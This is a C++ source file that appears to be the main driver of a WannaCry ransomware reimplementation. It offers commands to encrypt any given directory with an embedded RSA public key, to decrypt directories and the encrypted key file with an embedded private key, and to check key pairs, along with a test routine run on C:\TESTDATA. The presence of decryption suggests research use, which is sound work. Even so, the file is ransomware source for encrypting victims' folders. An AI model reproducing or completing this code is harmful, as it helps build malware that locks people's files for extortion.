#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <ShlObj.h>
#include "WanaFile.h"
#include "WanaProc.h"
#include "hexdump.h"
#include "ezfile.h"
#include "WanaFile.h"
#include "WanaEncryptor.h"
#include "WanaDecryptor.h"
#include "keys.h"

BOOL DecryptLocalEKY(DWORD nKeyNo)
{
	UCHAR aEkyBuffer[4096];
	UCHAR aDkyBuffer[4096];
	ULONG cbEkyBuffer = 0;
	ULONG cbDkyBuffer = 0;
	ULONG cbResult;
	BOOL bResult = FALSE;
	ReadEkyFile(aEkyBuffer, sizeof(aEkyBuffer), &cbEkyBuffer);
	DEBUG("Decrypt\n");
	PEZRSA pDecRSA = new EZRSA();
	pDecRSA->Import(
		BCRYPT_RSAPRIVATE_BLOB,
		WannaPrivateKey(),
		WannaPrivateKeySize());
	bResult = pDecRSA->Decrypt(
		(PUCHAR)aEkyBuffer,
		cbEkyBuffer,
		aDkyBuffer,
		sizeof(aDkyBuffer),
		&cbDkyBuffer);
	if (!bResult) {
		DEBUG("Decrypt fails\n");
		return FALSE;
	}
	delete pDecRSA;
	WriteDkyFile(aDkyBuffer, cbDkyBuffer, &cbResult);
	return TRUE;
}

int main1()
{
	UCHAR* s = (UCHAR*)"This is a test";
	RESDATA r;
	ReadResFile(&r);
	hexdump((PUCHAR)&r, sizeof(r));
	StartEncryptor();
	DecryptLocalEKY(0);
	PWanaDecryptor pDecryptor = new WanaDecryptor();
	pDecryptor->Decrypt(_T("C:\\TESTDATA"));
	delete pDecryptor;
	return 0;
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc < 2) {
		_ftprintf(stderr, _T("Usage:\n"));
		_ftprintf(stderr, _T("DecryptEKY\n"));
		_ftprintf(stderr, _T("Encrypt DIR\n"));
		_ftprintf(stderr, _T("Decrypt DIR\n"));
		_ftprintf(stderr, _T("CheckKeyPair PublicFile PrivateFile\n"));
	}
	else if (!_tcsicmp(argv[1], _T("DecryptEKY"))) {
		DecryptLocalEKY(0);
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("Encrypt")) && argc > 2) {
		PWanaCryptor pCryptor =
			new WanaCryptor(
				WannaPublicKey(),
				WannaPublicKeySize());
		pCryptor->Encrypt(argv[2]);
		delete pCryptor;
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("Decrypt")) && argc > 2) {
		PWanaDecryptor pDecryptor = new WanaDecryptor();
		pDecryptor->Decrypt(argv[2]);
		delete pDecryptor;
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("CheckKeyPair"))) {
		TCHAR szPKYFile[MAX_PATH];
		TCHAR szDKYFile[MAX_PATH];
		GetPkyFileName(szPKYFile);
		GetDkyFileName(szDKYFile);
		BOOL bResult = RSAFileMatch(
			szPKYFile,
			szDKYFile);
		_tprintf(_T("return: %d\n"), bResult);
		return 0;
	}
	else {
		_tprintf(_T("unknown: %s\n"), argv[1]);
		return 1;
	}
	return 0;
}
